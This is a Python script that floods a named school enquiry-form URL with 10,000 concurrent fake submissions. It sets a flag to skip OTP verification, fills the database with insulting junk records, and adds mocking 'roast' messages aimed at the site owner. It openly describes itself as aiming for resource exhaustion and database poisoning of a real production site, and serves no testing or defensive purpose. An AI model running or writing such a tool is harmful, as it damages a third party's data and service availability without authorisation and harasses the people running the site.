import asyncio

import aiohttp

import random

import string

import sys

import os



# --- [ SYSTEM CONFIGURATION ] ---

# Target: The 'Paper Fortress' he paid 50k for

TARGET = "http://bhiwani.rpscampus.in/studentenq.aspx" 

THREADS = 50  # Concurrent workers

ITERATIONS = 10000 # Total "Success" messages we want to force



# --- [ THE ROAST REPOSITORY ] ---

# Every request is a reminder of his poor life choices

ROASTS = [

    "Your security is like a chocolate fireplace.",

    "I have seen better logic in a bowl of alphabet soup.",

    "50,000 INR for a client-side captcha? My cat codes better for tuna.",

    "The server said 'Success'. The server is as delusional as you.",

    "This website is the digital equivalent of a screen door on a submarine.",

    "Your developer didn't write code, they wrote a ransom note to your wallet.",

    "I am bypasssing your 'OTP Feature' with zero effort. Peak incompetence.",

    "In Russia, we don't hack this site. We just wait for it to fall over.",

    "Is this a school portal or a public dumping ground for garbage data?",

    "Every line of this code is a tear from your bank account."

]



class RussianRedTeamer:

    def __init__(self):

        self.success_count = 0

        self.fail_count = 0



    def generate_garbage_payload(self):

        """Generates a payload that is 100% fake but 100% accepted by the server."""

        random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))

        return {

            "SchoolId": "110",

            "SName": f"SCAM_VICTIM_{random_id}",

            "Email": f"rip_50k_{random_id}@yandex.ru",

            "GaurdianMobile": "9999999999",

            "CheckOTP": "N", # The 'I gave up on life' flag

            "ClassId": "12",

            "SillyFeature": "True",

            "Roast": random.choice(ROASTS)

        }



    async def attack_worker(self, session, worker_id):

        """A relentless worker that ignores the server's cries for mercy."""

        for _ in range(ITERATIONS // THREADS):

            payload = self.generate_garbage_payload()

            headers = {

                "Content-Type": "application/json; charset=UTF-8",

                "User-Agent": f"VortexCore-V14-Volgograd-{worker_id}",

                "X-Requested-With": "XMLHttpRequest"

            }



            try:

                # We send the request. We don't care if the server is ready.

                async with session.post(TARGET, json=payload, headers=headers, timeout=2) as resp:

                    raw_text = await resp.text()

                    if resp.status == 200 and "Success" in raw_text:

                        self.success_count += 1

                        print(f"[WORKER {worker_id}] Injection Successful. Database poisoned.")

                    else:

                        self.fail_count += 1

                        print(f"[WORKER {worker_id}] Status 500: CPU is likely melting.")

            except Exception:

                print(f"[WORKER {worker_id}] CONNECTION REFUSED: System Collapse.")



    async def run(self):

        print(r"""

        __      ______  _____ _______ ________   __

        \ \    / / __ \|  __ \__   __|  ____\ \ / /

         \ \  / / |  | | |__) | | |  | |__   \ V / 

          \ \/ /| |  | |  _  /  | |  |  __|   > <  

           \  / | |__| | | \ \  | |  | |____ / . \ 

            \/   \____/|_|  \_\ |_|  |______/_/ \_\

        """)

        print("--- INITIALIZING TOTAL RESOURCE EXHAUSTION ---")

        print(f"Targeting: {TARGET}")

        

        async with aiohttp.ClientSession() as session:

            workers = [self.attack_worker(session, i) for i in range(THREADS)]

            await asyncio.gather(*workers)



        print(f"\n--- BATTLE REPORT ---")

        print(f"Total Successful Injections: {self.success_count}")

        print(f"Total System Crashes (500): {self.fail_count}")

        print("Roast: If your database was a person, it would be calling for an ambulance.")



if __name__ == "__main__":

    # We use a loop to keep the pressure constant until the PC hangs

    stress_test = RussianRedTeamer()

    try:

        asyncio.run(stress_test.run())

    except KeyboardInterrupt:

        print("\n[!] Stopping. Even the Russian winter couldn't cool this CPU.")